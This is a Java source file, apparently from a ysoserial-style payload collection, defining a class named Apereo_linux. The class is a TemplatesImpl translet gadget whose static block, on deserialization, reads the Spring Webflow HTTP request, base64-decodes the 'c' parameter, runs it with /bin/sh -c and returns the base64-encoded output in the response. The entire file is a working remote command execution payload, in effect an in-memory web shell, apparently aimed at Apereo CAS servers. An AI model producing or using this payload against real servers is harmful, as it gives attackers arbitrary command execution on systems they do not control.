package ysoserial.payloads.external;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.webflow.context.ExternalContext;
import org.springframework.webflow.context.ExternalContextHolder;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.bind.DatatypeConverter;
import java.io.InputStream;
import java.io.Serializable;
import java.util.Scanner;


public class Apereo_linux extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;
    static {
        try {
            //  org\springframework\webflow\spring-webflow\2.4.1.RELEASE\spring-webflow-2.4.1.RELEASE.jar!\org\springframework\webflow\context\ExternalContextHolder.class
            ExternalContext externalcontext = ExternalContextHolder.getExternalContext();

            // init request and response
            Object request = externalcontext.getNativeRequest();
            Object response = externalcontext.getNativeResponse();
            HttpServletRequest httprequest = (HttpServletRequest) request;
            HttpServletResponse httpresponse = (HttpServletResponse) response;


            // exexute shell to base64
            // String params = httprequest.getParameter("c");
            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
            // String[] command = {"/bin/sh", "-c", params};
            InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", params}).getInputStream();

            Scanner scan = new Scanner(in).useDelimiter("\\A");
            String d = scan.hasNext() ? scan.next() : "";
            // return command result to base64
            String base64Str = "";
            base64Str = DatatypeConverter.printBase64Binary(d.getBytes());
            httpresponse.getWriter().write(base64Str);

            // over http session
            httpresponse.getWriter().flush();
            httpresponse.getWriter().close();

        } catch (Exception e) {
            //  Block of code to handle errors
            e.getStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }


    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
